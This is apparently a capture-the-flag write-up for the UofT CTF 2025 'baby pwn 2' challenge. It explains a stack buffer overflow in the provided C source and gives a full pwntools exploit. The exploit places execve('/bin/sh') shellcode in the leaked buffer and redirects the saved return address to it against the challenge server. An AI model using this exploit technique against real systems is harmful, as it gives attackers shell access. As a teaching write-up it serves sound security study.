---
layout: writeup
category: UofT-CTF-2025
chall_description: 
points: 100
solves: 264
tags: pwn pwn/buffer-overflow pwn/ret2win
date: 2025-1-12
comments: false
---

Here's a baby pwn challenge for you to try out. Can you get the flag?

nc 34.162.142.123 5000

Author: atom

[baby-pwn-2.zip](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UofT-CTF-2025/baby-pwn-2.zip)  

---

We're provided the binary along with the source file:  

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function()
{
    char buffer[64];
    printf("Stack address leak: %p\n", buffer);
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Welcome to the baby pwn 2 challenge!\n");
    vulnerable_function();
    printf("Goodbye!\n");
    return 0;
}
```

`checksec` output:  

```yaml
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

`NX` is disabled --> implies shellcode is likely the solution.  

We also have a simple buffer overflow of 128 bytes read into the 64 byte `buffer`. And we're given a stack leak of the address of `buffer`.  

Basically, we can just write shellcode into `buffer`, and then overwrite saved RIP with the address of `buffer` that was leaked by the program. Then, the program will jump to our shellcode instructions in `buffer`, and run whatever we want!  

For the shellcode, we can create a pretty simple one to call `system("/bin/sh\x00")` (null-terminated because that's how C interprets strings!).  

Here's the exploit:  

```py
#-----------RIP OFFSET------------#
# send(cyclic(128, n=8), b': ')
# p.interactive()
# exit()

#--------------LEAK---------------#
p.recvuntil(b': ')
buffer = int(p.recvline(), 16)

#--------------WIN----------------#
offset = cyclic_find('jaaaaaaa', n=8)
payload = bytes(asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
'''))
payload = payload.ljust(offset, b'\x00')
payload += p64(buffer)
send(payload, b': ')
```

And we get the flag!  

    uoftctf{sh3llc0d3_1s_pr3tty_c00l}

Full script:  

```py
# Useful references:
# https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

from pwn import *
import sys
import os

#---------HELPER FUNCTIONS---------#

def get_leak(before: bytes, end: bytes=b'\n') -> int:
    p.recvuntil(before)
    return int(p.recvuntil(end).decode('ascii')[:-1], 16)

def send(payload: bytes, before: bytes=b'', line: bool=True) -> int:
    payload = payload + (b'\n' if line else b'')
    if before == b'':
        p.send(payload)
    else:
        p.sendafter(before, payload)


#---------SETUP---------#

args = list(map(lambda s: s.upper(), sys.argv))
_libcs = list(filter(lambda s: 'libc.so.6' in s, os.listdir()))
_lds = list(filter(lambda s: 'ld' == s[:2], os.listdir()))

elf = ELF("baby-pwn-2") #------TODO------#
libc = _libcs[0] if len(_libcs) else elf.libc
ld = _lds[0] if len(_lds) else None

context.binary = elf
context.log_level = "DEBUG"

gdbscript = '''
# 
'''

if 'REMOTE' in args:
    p = remote('34.162.119.16', 5000) #------TODO------#
else:
    p = process([elf.path])
    gdb.attach(p, gdbscript=gdbscript)


###################################
#==========BEGIN EXPLOIT==========#
###################################

#-----------RIP OFFSET------------#
# send(cyclic(128, n=8), b': ')
# p.interactive()
# exit()

#--------------LEAK---------------#
p.recvuntil(b': ')
buffer = int(p.recvline(), 16)

#--------------WIN----------------#
offset = cyclic_find('jaaaaaaa', n=8)
payload = bytes(asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
'''))
payload = payload.ljust(offset, b'\x00')
payload += p64(buffer)
send(payload, b': ')

###################################
#===========END EXPLOIT===========#
###################################

p.interactive()
p.close()

# uoftctf{sh3llc0d3_1s_pr3tty_c00l}
```